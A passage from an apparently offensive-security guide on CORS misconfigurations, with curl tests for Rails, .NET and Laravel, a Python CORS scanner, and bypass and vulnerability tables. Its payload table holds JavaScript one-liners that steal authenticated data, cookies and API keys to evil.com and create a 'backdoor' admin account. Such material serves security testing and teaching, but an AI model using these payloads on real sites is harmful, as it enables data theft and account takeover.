curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: _session_id=xxx" | grep "access-control"

# Test 3: Regex origin matching
curl -sI https://target.com/api/me \
  -H "Origin: https://eviltarget.com" | grep "access-control"

# Vulnerable Rails config:
# allow do |source, env|
#   source.origin = env['HTTP_ORIGIN']
#   source.credentials = true
# end
```

:::

:::tabs-item{icon="i-lucide-code" label="ASP.NET / .NET"}

```bash [ASP.NET CORS Test]
# .NET CORS misconfigurations:

# Test 1: AllowAnyOrigin() with AllowCredentials()
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" | grep "access-control"

# Test 2: WithOrigins() regex bypass
curl -sI https://target.com/api/me \
  -H "Origin: https://eviltarget.com" \
  -H "Cookie: .AspNetCore.Cookies=xxx" | grep "access-control"

# Test 3: SetIsOriginAllowed(_ => true)
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" | grep "access-control"

# Vulnerable .NET code:
# builder.WithOrigins("*").AllowCredentials()  // throws error in .NET Core
# builder.SetIsOriginAllowed(_ => true).AllowCredentials()  // vulnerable!
# policy.AllowAnyOrigin().AllowCredentials()
```

:::

:::tabs-item{icon="i-lucide-code" label="PHP / Laravel"}

```bash [PHP/Laravel CORS Test]
# fruitcake/laravel-cors misconfigurations:

# Test 1: 'allowed_origins' => ['*']
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" | grep "access-control"

# Test 2: Manual header setting
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: laravel_session=xxx" | grep "access-control"

# Vulnerable PHP code:
# header('Access-Control-Allow-Origin: ' . $_SERVER['HTTP_ORIGIN']);
# header('Access-Control-Allow-Credentials: true');
# 'supports_credentials' => true, 'allowed_origins' => ['*']
```

:::

::

---

## Tooling & Automation

### Custom CORS Scanner

```python [cors_scanner.py]
#!/usr/bin/env python3
"""
Comprehensive CORS Misconfiguration Scanner
Tests arbitrary origin, null origin, regex bypasses, and subdomain trust
"""

import requests
import sys
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

class CORSScanner:
    def __init__(self, target, cookie=None):
        self.target = target
        self.headers = {}
        if cookie:
            self.headers['Cookie'] = cookie
        self.findings = []
        self.parsed = urlparse(target)
        self.domain = self.parsed.netloc.split(':')[0]
        
    def test_origin(self, origin, test_name):
        try:
            headers = {**self.headers, 'Origin': origin}
            r = requests.get(self.target, headers=headers, timeout=10, 
                           allow_redirects=False, verify=False)
            
            acao = r.headers.get('Access-Control-Allow-Origin', '')
            acac = r.headers.get('Access-Control-Allow-Credentials', '')
            acam = r.headers.get('Access-Control-Allow-Methods', '')
            acah = r.headers.get('Access-Control-Allow-Headers', '')
            aceh = r.headers.get('Access-Control-Expose-Headers', '')
            
            reflected = (acao == origin) or (acao == '*')
            
            if reflected or acao == 'null':
                severity = 'CRITICAL' if acac.lower() == 'true' else 'HIGH' if acao != '*' else 'MEDIUM'
                finding = {
                    'test': test_name,
                    'origin': origin,
                    'severity': severity,
                    'acao': acao,
                    'acac': acac,
                    'acam': acam,
                    'acah': acah,
                    'aceh': aceh,
                    'status': r.status_code
                }
                self.findings.append(finding)
                return finding
        except Exception as e:
            pass
        return None

    def generate_origins(self):
        base = self.domain.replace('www.', '')
        origins = {
            'Arbitrary Origin': f'https://evil.com',
            'Another Arbitrary': f'https://attacker.com',
            'null Origin': 'null',
            'Subdomain': f'https://evil.{base}',
            'Suffix Bypass': f'https://evil{base}',
            'Prefix Bypass': f'https://{base}.evil.com',
            'Dot Bypass': f'https://{base.replace(".", "X", 1)}.evil.com',
            'HTTP Downgrade': f'http://{base}',
            'With Port': f'https://{base}:8443',
            'Backtick': f'https://{base}%60evil.com',
            'Null Byte': f'https://{base}%00evil.com',
            'Underscore': f'https://{base.replace(".", "_")}.evil.com',
            'Hyphen Suffix': f'https://evil-{base}',
            'At Sign': f'https://{base}%40evil.com',
            'Hash': f'https://evil.com%23.{base}',
            'Localhost': 'http://localhost',
            'IPv4 Localhost': 'http://127.0.0.1',
            'IPv6 Localhost': 'http://[::1]',
            'Internal IP': 'http://192.168.1.1',
            'Metadata': 'http://169.254.169.254',
        }
        return origins
    
    def scan(self):
        print(f"[*] CORS Scanner — Target: {self.target}")
        print(f"[*] Domain: {self.domain}")
        print(f"{'='*70}\n")
        
        origins = self.generate_origins()
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {}
            for name, origin in origins.items():
                f = executor.submit(self.test_origin, origin, name)
                futures[f] = name
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    sev = result['severity']
                    icon = '💀' if sev == 'CRITICAL' else '⚠️' if sev == 'HIGH' else '📝'
                    print(f"  {icon} [{sev}] {result['test']}")
                    print(f"     Origin: {result['origin']}")
                    print(f"     ACAO: {result['acao']}")
                    print(f"     Credentials: {result['acac']}")
                    if result['acam']:
                        print(f"     Methods: {result['acam']}")
                    if result['acah']:
                        print(f"     Headers: {result['acah']}")
                    print()
        
        # Vary header check
        try:
            r = requests.get(self.target, headers={**self.headers, 'Origin': 'https://evil.com'}, 
                           timeout=10, verify=False)
            vary = r.headers.get('Vary', '')
            if 'Origin' not in vary and r.headers.get('Access-Control-Allow-Origin'):
                print(f"  ⚠️  [MEDIUM] Vary header does not include 'Origin' — Cache poisoning possible")
                print(f"     Vary: {vary}\n")
        except:
            pass
        
        # Summary
        print(f"{'='*70}")
        print(f"[*] Total findings: {len(self.findings)}")
        critical = len([f for f in self.findings if f['severity'] == 'CRITICAL'])
        high = len([f for f in self.findings if f['severity'] == 'HIGH'])
        medium = len([f for f in self.findings if f['severity'] == 'MEDIUM'])
        print(f"    Critical: {critical} | High: {high} | Medium: {medium}")
        
        if self.findings:
            print(f"\n[*] Exploit suggestion:")
            best = self.findings[0]
            if best['acac'].lower() == 'true':
                print(f"    Host CORS exploit page, victim visits → all authenticated data stolen")
                print(f"    Use origin: {best['origin']}")
            elif best['acao'] == '*':
                print(f"    Wildcard ACAO — can read public/token-auth responses")
        
        return self.findings

if __name__ == '__main__':
    target = sys.argv[1]
    cookie = sys.argv[2] if len(sys.argv) > 2 else None
    scanner = CORSScanner(target, cookie)
    findings = scanner.scan()
    
    with open('cors_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)
    print(f"\n[*] Results saved to cors_findings.json")
```

### Tool Command Reference

::collapsible

| Tool | Command | Purpose |
| --- | --- | --- |
| Corsy | `python3 corsy.py -u URL` | Automated CORS misconfiguration scanner |
| CORScanner | `python3 cors_scan.py -u URL` | CORS vulnerability detection |
| Nuclei | `nuclei -u URL -tags cors` | Template-based CORS scanning |
| ffuf | `ffuf -u URL -H "Origin: FUZZ" -w origins.txt -mr "evil"` | Origin fuzzing |
| dalfox | `dalfox url URL --cors` | XSS scanner with CORS checks |
| Burp Suite | Match & Replace → add Origin header | Passive and active CORS testing |
| curl | `curl -sI URL -H "Origin: https://evil.com"` | Manual header testing |
| httpx | `echo URL \| httpx -H "Origin: https://evil.com" -match-string "evil.com"` | Mass CORS check |
| subfinder | `subfinder -d domain` | Subdomain discovery for trust bypass |
| subjack | `subjack -w subs.txt -ssl` | Subdomain takeover detection |
| gau | `gau domain \| grep api` | API endpoint discovery |
| katana | `katana -u URL -d 3 -jc` | JS-aware crawling for endpoints |
| Interactsh | `interactsh-client -v` | Out-of-band exfiltration receiver |

::

---

## Quick Reference

### CORS Vulnerability Matrix

::collapsible

| ACAO Response | ACAC Response | Exploitable? | Impact | Exploit Method |
| --- | --- | --- | --- | --- |
| Reflects attacker origin | `true` | ✅ Critical | Full authenticated data theft | `fetch(url, {credentials:'include'})` |
| `null` | `true` | ✅ Critical | Full authenticated data theft | Sandboxed iframe with `Origin: null` |
| Reflects attacker origin | `false` / missing | ⚠️ Medium | Non-authenticated data only | `fetch(url)` without credentials |
| `*` | `false` / missing | ⚠️ Low-Med | Public data readable cross-origin | `fetch(url)` — no cookies sent |
| `*` | `true` | ❌ Invalid | Browser rejects (spec violation) | Not exploitable — browser enforces |
| Reflects only whitelisted | `true` | ⚠️ Depends | Need regex bypass or subdomain | Test bypass patterns |
| No ACAO header | N/A | ❌ Not vuln | SOP enforced | Standard SOP applies |

::

### Exploit Payload Quick Reference

::collapsible

| Scenario | Payload |
| --- | --- |
| Basic data theft | `fetch('https://target.com/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://evil.com/c',{method:'POST',body:JSON.stringify(d)}))` |
| null origin exploit | `<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://target.com/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>{new Image().src='https://evil.com/?d='+btoa(d)})</script>">` |
| Cookie theft | `fetch('https://target.com/api/me',{credentials:'include'}).then(r=>{navigator.sendBeacon('https://evil.com/s',document.cookie)})` |
| Account takeover | Extract user data → change email → password reset to attacker email |
| API key theft | `fetch('https://target.com/api/keys',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://evil.com/k',{method:'POST',body:JSON.stringify(d)}))` |
| Admin panel theft | `fetch('https://target.com/api/admin/users',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://evil.com/a',{method:'POST',body:JSON.stringify(d)}))` |
| GraphQL introspection | `fetch('https://target.com/graphql',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({query:'{__schema{types{name fields{name}}}}'})}).then(r=>r.json()).then(d=>fetch('https://evil.com/gql',{method:'POST',body:JSON.stringify(d)}))` |
| Create backdoor user | `fetch('https://target.com/api/admin/users',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'backdoor',password:'P@ss!',role:'admin'})})` |
| XHR variant | `var x=new XMLHttpRequest();x.open('GET','https://target.com/api/me');x.withCredentials=true;x.onload=function(){new Image().src='https://evil.com/?d='+btoa(x.responseText)};x.send()` |

::

### Origin Bypass Patterns Quick Reference

::collapsible

| Validation Type | Weak Pattern | Bypass Origin |
| --- | --- | --- |
| Suffix match | `endsWith('target.com')` | `https://eviltarget.com` |
| Suffix match | `endsWith('.target.com')` | `https://evil-target.com` (if no dot check) |
| Prefix match | `startsWith('https://target.com')` | `https://target.com.evil.com` |
| Contains | `includes('target.com')` | `https://target.com.evil.com` |
| Regex unescaped dot | `/target.com/` | `https://targetXcom.evil.com` |
| Regex no anchor | `/target\.com$/` | `https://eviltarget.com` |
| Subdomain trust | `/\.target\.com$/` | XSS on any `*.target.com` |
| null trust | `origin === 'null'` | `<iframe sandbox="allow-scripts">` |
| Protocol ignored | HTTPS not enforced | `http://target.com` (MITM) |
| Backtick injection | URL parser confusion | `https://target.com%60evil.com` |
| At-sign | URL parser confusion | `https://target.com%40evil.com` |
| Null byte | String truncation | `https://target.com%00evil.com` |

::

---

## References & Resources

::card-group

::card
---
title: PortSwigger — CORS Vulnerabilities
icon: i-simple-icons-portswigger
to: https://portswigger.net/web-security/cors
target: _blank
---
Comprehensive CORS vulnerability research, labs, and exploitation techniques from PortSwigger Web Security Academy.
::

::card
---
title: OWASP — CORS Misconfiguration
icon: i-lucide-shield-check
to: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing
target: _blank
---
OWASP testing guide for CORS misconfigurations with methodology and test cases.
::

::card
---
title: HackTricks — CORS Bypass
icon: i-lucide-book-open
to: https://book.hacktricks.wiki/en/pentesting-web/cors-bypass.html
target: _blank
---
Extensive CORS bypass techniques with real-world examples, null origin exploitation, and regex bypass patterns.
::

::card
---
title: Corsy — CORS Scanner
icon: i-simple-icons-github
to: https://github.com/s0md3v/Corsy
target: _blank
---
Automated CORS misconfiguration scanner by s0md3v. Tests for origin reflection, null origin trust, and regex bypasses.
::

::card
---
title: CORScanner
icon: i-simple-icons-github
to: https://github.com/chenjj/CORScanner
target: _blank
---
Fast CORS misconfiguration scanner supporting multiple bypass techniques and batch URL scanning.
::

::card
---
title: MDN — CORS Documentation
icon: i-simple-icons-mozilla
to: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
target: _blank
---
Official MDN documentation for Cross-Origin Resource Sharing, covering headers, preflight requests, and browser behavior.
::

::card
---
title: PayloadsAllTheThings — CORS
icon: i-simple-icons-github
to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
target: _blank
---
Community payload repository with CORS exploitation payloads, bypass origins, and proof-of-concept templates.
::

::card
---
title: James Kettle — CORS Research
icon: i-simple-icons-portswigger
to: https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
target: _blank
---
Original research paper "Exploiting CORS Misconfigurations for Bitcoins and Bounties" by James Kettle demonstrating real-world CORS exploitation.
::

::card
---
title: W3C CORS Specification
icon: i-lucide-file-text
to: https://www.w3.org/TR/cors/
target: _blank
---
Official W3C specification for Cross-Origin Resource Sharing defining header semantics, preflight behavior, and security model.
::

::card
---
title: Fetch Standard — CORS Protocol
icon: i-lucide-file-text
to: https://fetch.spec.whatwg.org/#http-cors-protocol
target: _blank
---
WHATWG Fetch specification defining the current CORS protocol implementation used by modern browsers.
::

::card
---
title: Nuclei CORS Templates
icon: i-simple-icons-github
to: https://github.com/projectdiscovery/nuclei-templates/tree/main/http/misconfiguration/cors
target: _blank
---
ProjectDiscovery Nuclei templates for automated CORS misconfiguration detection across multiple bypass patterns.
::

::card
---
title: Can I Take Over XYZ
icon: i-simple-icons-github
to: https://github.com/EdOverflow/can-i-take-over-xyz
target: _blank
---
Reference for subdomain takeover possibilities across cloud services — essential for CORS subdomain trust exploitation chains.
::

::